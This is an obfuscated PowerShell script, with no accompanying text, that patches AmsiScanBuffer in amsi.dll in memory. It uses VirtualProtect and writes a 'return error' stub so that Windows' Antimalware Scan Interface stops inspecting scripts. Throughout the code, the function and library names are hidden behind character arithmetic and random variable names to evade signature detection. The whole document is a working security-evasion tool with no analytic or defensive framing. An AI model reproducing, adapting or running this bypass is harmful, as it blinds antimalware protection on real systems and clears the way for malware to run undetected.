$m3r0q2h9My = @"
using System;
using System.Runtime.InteropServices;
public class m3r0q2h9My {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Dw57muSjHBp, string EiQ4);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lyEqFbok, UIntPtr ySj9qWPOsdvRV, uint tPC3bev7jxkM91D1KO, out uint OjPfcgsDQMAkyzen6);
}
"@

Add-Type $m3r0q2h9My

$hI8_KgjWnMCv = [m3r0q2h9My]::LoadLibrary("$(('ä'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').nORmaLIzE([ChAr](70+18-18)+[cHar](111*80/80)+[cHAr]([ByTe]0x72)+[char]([bYte]0x6d)+[chAR](68)) -replace [CHaR](92+53-53)+[cHAR]([byTe]0x70)+[cHAR](4+119)+[CHar]([BYTe]0x4d)+[CHar](110*88/88)+[cHAR](125+19-19))")
$DzHHuJY = [m3r0q2h9My]::GetProcAddress($hI8_KgjWnMCv, "$([chAr](35+30)+[Char](109*46/46)+[ChaR]([BYtE]0x73)+[ChaR]([BYTe]0x69)+[chAr]([BYTE]0x53)+[Char]([byTE]0x63)+[CHAr](97)+[cHar](110+46-46)+[CHAr]([BytE]0x42)+[CHAr]([BYTe]0x75)+[char]([Byte]0x66)+[char](102)+[cHar](101)+[CHaR](35+79))")
$p = 0
[m3r0q2h9My]::VirtualProtect($DzHHuJY, [uint32]5, 0x40, [ref]$p)
$oV_x4Sv = "0xB8"
$Mjbv3wQg = "0x57"
$tjIVtGwTDA4gQ = "0x00"
$uZbZVS = "0x07"
$YzErAN = "0x80"
$i89odi9yhfkArFs = "0xC3"
$PHDD5lh6ZXYUvukA8Er = [Byte[]] ($oV_x4Sv,$Mjbv3wQg,$tjIVtGwTDA4gQ,$uZbZVS,+$YzErAN,+$i89odi9yhfkArFs)
[System.Runtime.InteropServices.Marshal]::Copy($PHDD5lh6ZXYUvukA8Er, 0, $DzHHuJY, 6)